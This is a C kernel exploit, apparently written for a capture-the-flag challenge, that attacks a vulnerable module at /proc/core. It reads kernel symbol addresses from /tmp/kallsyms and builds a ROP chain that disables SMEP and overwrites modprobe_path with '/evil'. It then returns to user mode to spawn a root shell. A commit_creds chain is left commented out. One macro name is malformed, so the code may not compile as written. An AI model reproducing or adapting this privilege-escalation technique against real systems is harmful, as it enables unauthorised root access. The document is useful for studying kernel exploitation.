#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#define GREEN printf("\033[32m\033[1m");
#define RED printf("\033[31m\033[1m");
#define END  printf("\033[0m\n");
#define LOG(...) \
	do { \
		GREEN \
		printf("[%s:%d]",__FILE__, __LINE__); \
		printf(__VA_ARGS__); \
		END \
	} while(0)

#define DEBUG(...) \
	do { \
		RED \
		printf("[%s:%d]",__FILE__, __LINE__); \
		printf(__VA_ARGS__); \
		END \
	} while(0)

size_t commit_creds=0;
size_t prepare_kernel_cred=0;
size_t core_init=0;
size_t raw_commit_creds = 0xffffffff8107cda0;
size_t ko_offset = 0;
size_t vm_offset = 0;
size_t pop_rdi_ret=0xffffffff8210c764;
size_t pop_rax_ret=0xffffffff829e4686;
size_t modprobe_path=0xffffffff82442400;
size_t write_rax_into_rdi_ret=0xffffffff82293bfc;
size_t swapgs_pop_ret=0xffffffff81c00e7a;
size_t iretq	= 0xffffffff82aa36e0;
size_t raw_core_init = 0x7a ;
#define  SWAPGS_POPFQ_RET        0x0
#define  IRETQ_RET               0x5
#define  POP_RDI_RET             0x8
#define  POP_RAX_RET             0xe
#define  MOV_CR4_RDI_RET         0xa
#define  MOV_[RDI]_RAX_RET       0x10

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__(
			"mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
	       );
}
void get_root_privilige(void)
{
	void * (*prepare_kernel_cred_ptr)(void *) = (void *)prepare_kernel_cred;
	int (*commit_creds_ptr)(void *) = (void *)commit_creds;
	(*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
void get_root_shell(void)
{   
	__asm__(
			"pop rbp;"
	       );
	system("/bin/sh");
}
void find_sym(void)
{
	FILE *sym_table_fd = fopen("/tmp/kallsyms", "r");
	if(sym_table_fd < 0)
	{
		DEBUG("[x] Failed to open the sym_table file!");
		exit(-1);
	}
	char line[0x100];
	int i=0;
	while(fgets(line,0x100,sym_table_fd))
	{
		if(strstr(line, " commit_creds"))
		{
			sscanf(line, "%lx", &commit_creds);
			vm_offset=commit_creds-raw_commit_creds;
			LOG("commit_cread:%p",commit_creds);
			continue;
		}
		if(strstr(line, " prepare_kernel_cred"))
		{
			sscanf(line, "%lx", &prepare_kernel_cred);
			LOG("prepare_kernel_cred:%p",prepare_kernel_cred);
			continue;
		}
		if(strstr(line, " core_init"))
		{
			sscanf(line, "%lx", &core_init);
			LOG("core_init:%p",core_init);
			ko_offset=core_init-raw_core_init;
			continue;
		}
	}
	fclose(sym_table_fd);
	LOG("ko_offset:%p",ko_offset);
	LOG("vm_offset:%p",vm_offset);

}
int main(int argc, char ** argv)
{
	find_sym();
	LOG("start to exp");
	save_status();
	int fd = open("/proc/core", 2);
	if(fd <0)
	{
		DEBUG("Failed to open the file: /proc/core");
		exit(-1);
	}
	size_t rop[0x100], i = 0;
	for(; i < 2;i++)
		rop[i] = 0xdeadbeef;
	/*
	rop[i++] = POP_RDI_RET+ko_offset;
	rop[i++] = 0x6f0;
	rop[i++] = MOV_CR4_RDI_RET+ko_offset;
	rop[i++] = (size_t)get_root_privilige;
	rop[i++] = SWAPGS_POPFQ_RET + ko_offset;
	rop[i++] = 0;
	rop[i++] = IRETQ_RET + ko_offset;
	rop[i++] = (size_t)get_root_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;
*/
	rop[i++] = POP_RDI_RET+ko_offset;
	rop[i++] = 0x6f0;
	rop[i++] = MOV_CR4_RDI_RET+ko_offset;
	rop[i++] = POP_RAX_RET+ko_offset;
	rop[i++] = 0x6c6976652f; // rax: /evil
	rop[i++] = POP_RDI_RET+ko_offset;
	rop[i++] = modprobe_path+vm_offset;
	rop[i++] = 0x10+ko_offset;
	rop[i++] = SWAPGS_POPFQ_RET + ko_offset;
	rop[i++] = 0;
	rop[i++] = IRETQ_RET + ko_offset;
	rop[i++] = (size_t)get_root_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;
	//write(fd, rop,sizeof(rop));
	write(fd, rop,0x100);
	//write(fd, rop,1);
}
